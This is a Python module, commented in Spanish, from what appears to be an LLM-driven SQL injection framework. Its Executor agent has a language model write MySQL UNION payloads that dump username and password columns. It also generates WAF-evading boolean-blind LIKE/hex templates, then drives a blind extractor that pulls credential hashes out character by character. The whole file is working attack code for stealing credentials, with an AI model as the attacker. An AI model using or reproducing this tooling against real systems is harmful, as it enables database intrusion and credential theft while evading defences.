"""Executor: EJECUTA la técnica elegida. En UNION genera el payload de extracción; en boolean-blind
genera la forma de comparación (validada) y MANEJA el BlindExtractor (una herramienta determinista)
para extraer carácter por carácter. El LLM genera la forma del ataque; el código la ejecuta."""
from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Optional, Sequence

from .base import Agent
from ..blind import BlindExtractor
from ..llm import parse_json

_PROMPTS_DIR = Path(__file__).resolve().parent.parent / "prompts"
_DEFAULT_LIKE = "{col} LIKE {hex}"
_FORBIDDEN = ("select", "substring", "union", "ascii", "'", '"', "(")


def _valid_blind_template(tpl: str) -> bool:
    """La forma ciega debe usar LIKE+hex con los huecos {col}/{hex} y NO usar nada que el WAF puntúe
    (SELECT/UNION/SUBSTRING/ASCII/comillas/subconsultas)."""
    low = tpl.lower()
    if not ("{col}" in tpl and "{hex}" in tpl and "like" in low):
        return False
    if any(bad in low for bad in _FORBIDDEN):
        return False
    try:
        tpl.format(col="user", hex="0x2525")   # debe poder rellenarse sin romperse
    except Exception:
        return False
    return True


class Executor(Agent):
    def craft_dump(
        self,
        quote: str,
        columns: int,
        reflected: list[int],
        table: str,
        cred_columns: tuple[str, str],
    ) -> dict[str, Any]:
        """Pide al LLM el payload UNION que extrae usuario+contraseña de la tabla descubierta."""
        request = {
            "dbms": "MySQL",
            "quote_context": "string (quote with ')" if quote else "integer (no quote)",
            "column_count": columns,
            "reflected_positions": reflected,
            "table": table,
            "username_column": cred_columns[0],
            "password_column": cred_columns[1],
        }
        raw = self.llm.chat(self.system, json.dumps(request), json_mode=True, temperature=0.1)
        return parse_json(raw)

    def craft_blind(self, say=None) -> str:
        """Genera (con 1 llamada al LLM) la forma de comparación ciega que evade el WAF; la valida y
        si no sirve, usa la determinista. Es 'el payload del ataque' para la técnica boolean."""
        say = say or (lambda _m: None)
        try:
            system = (_PROMPTS_DIR / "executor_blind.md").read_text(encoding="utf-8")
            raw = self.llm.chat(system, "Give the blind comparison form.",
                                json_mode=True, temperature=0.1)
            tpl = str(parse_json(raw).get("compare", "")).strip()
        except Exception:
            tpl = ""
        if _valid_blind_template(tpl):
            say(f"[Executor] forma ciega generada: {tpl!r}")
            return tpl
        say(f"[Executor] forma ciega por respaldo determinista: {_DEFAULT_LIKE!r}")
        return _DEFAULT_LIKE

    def extract_blind(
        self,
        oracle,
        quote: str,
        user_cands: Sequence[str],
        pass_cands: Sequence[str],
        like: str,
        say=None,
    ) -> Optional[dict]:
        """EJECUTA la extracción ciega: maneja el BlindExtractor (herramienta determinista) con la
        forma generada y los candidatos de columna. Devuelve la fila extraída o None."""
        say = say or (lambda _m: None)
        bx = BlindExtractor(oracle, quote=quote, say=say,
                            user_cols=user_cands, pass_cols=pass_cands, like=like)
        if not bx.confirm():
            return None
        say(f"[Executor] inyección booleana confirmada (comillas={quote!r}); "
            f"ejecuta el BlindExtractor con la forma {like!r}")
        row = bx.dump_first_row()
        if row and row.get("hash"):
            say(f"[Executor] extraído con boolean-blind ({bx.requests} sondeos): {row}")
            return row
        return None
